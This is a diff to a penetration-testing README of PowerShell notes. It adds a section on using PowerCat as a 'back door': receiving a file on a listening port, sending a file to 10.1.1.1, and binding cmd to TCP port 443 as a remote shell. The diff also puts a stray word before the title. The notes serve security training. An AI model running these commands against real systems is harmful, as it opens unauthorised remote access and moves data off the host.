@@ -1,4 +1,4 @@
-# PowerShell for Penetration Testing
+receive# PowerShell for Penetration Testing
 
 Welcome to the [SnowCap Cyber](https://www.snowcapcyber.com) PowerShell for Penetration TestingGitHub repository. The goal of this repository is to provide you with a some notes that you may find useful when conducting a penetration test. Penetration begins with the ability to profile and map out a network and the systems associated with it.
 
@@ -169,8 +169,6 @@ The trick when creating and using tools for Penetration Testing is not to reinve
 * [TCP/UDP Port Scanner](https://github.com/calebstewart/Net-Scan)
 
 * [Posh SecMod](https://github.com/darkoperator/Posh-SecMod)
-
-* [PowerCat](https://github.com/besimorhino/powercat)
 
 It should be noted that many of the tools listed above will be detected, and classified as malicious software, by many anti-virus products. However, from a tools and techniques perspective they are useful and add value to out tool set. A Penetration Test begins with us profiling what is on a network. To achieve this we use a technique called an ARP scan. To achieve this we can make use of Get-NetNeighbor cmdlet.
 ```powershell
@@ -654,6 +652,25 @@ PS C:\> Invoke-Command -ComputerName 'dc01.snowcapcyber.com' -ScriptBlock {Get-S
 We can achieve the same results using the WmiObject interface as follows:
 ```powershell
 PS C:\> Get-WmiObject -Class Win32_Share -ComputerName DC01
+```
+
+We can also use PowerShell to create a back door to the target system.
+
+* [PowerCat](https://github.com/besimorhino/powercat)
+
+The [PowerCat](https://github.com/besimorhino/powercat) tool allows us to send and receive data as well as bind a shell to a TCP port. By default, [PowerCat](https://github.com/besimorhino/powercat) reads input from the console and writes input to the console using write-host. In the following we will use [PowerCat](https://github.com/besimorhino/powercat) to receive some data.
+```powershell
+PS C:\> powercat -l -p 8000 -of C:\inputfile
+```
+
+In the following we will use [PowerCat](https://github.com/besimorhino/powercat) to send some data to the target 10.1.1.1
+```powershell
+PS C:\> powercat -c 10.1.1.1 -p 443 -i C:\inputfile
+```
+
+We can also use [PowerCat](https://github.com/besimorhino/powercat) to bind a TCP port to shell.
+```powershell
+PS C:\> powercat -l -p 443 -e cmd
 ```
 
 ## Recommended Reading
